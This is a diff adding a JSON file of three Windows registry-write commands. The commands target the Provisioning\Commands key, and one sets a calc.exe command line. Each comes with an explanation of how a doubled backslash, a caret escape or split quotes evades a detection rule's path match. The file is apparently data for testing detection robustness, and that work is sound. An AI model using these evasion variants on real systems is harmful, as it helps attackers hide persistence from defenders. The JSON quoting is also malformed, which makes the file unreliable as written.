@@ -1,0 +1,14 @@
+[
+{
+"output": "reg.exe add "HKLM\SOFTWARE\Microsoft\Provisioning\\Commands\LOLBin\dummy1" /v altitude /t REG_DWORD /d 0",
+"explanation": "Insertion technique: Appending an extra backslash character ('\\') inside the targeted registry key path parameter. The rule checks for the exact contiguous literal string 'SOFTWARE\Microsoft\Provisioning\Commands\'. Adding a duplicate separator disrupts the string pattern match in the process creation logs, while the native Windows Registry engine and its core path normalization routines collapse consecutive backslashes, executing the registry creation successfully."
+},
+{
+"output": "cmd.exe /c "reg add HKLM\SOFTWARE\Microsoft\Pro^visioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe"",
+"explanation": "Insertion technique: Injects a command shell escape character caret ('^') directly into the targeted text block ('Pro^visioning'). When interpreted and evaluated via cmd.exe, the shell strips out the caret token and submits a clean path argument to reg.exe. However, the raw telemetry captures the caret, completely avoiding the rule's strict substring validation constraint for the contiguous key sequence."
+},
+{
+"output": "reg.exe add "HKLM\SOFTWARE\Microsoft\Provisioning""\Commands\LOLBin\dummy1" /v altitude /t REG_DWORD /d 0",
+"explanation": "Insertion technique: Splices the literal command-line path argument into two separate quoted string segments by introducing inline double quotes ('""'). Because process creation logs preserve the verbatim CLI telemetry text, the rule fails to capture the signature match. The internal internal argument parser consolidates adjacent quoted substrings seamlessly into a unified destination key context."
+}
+]
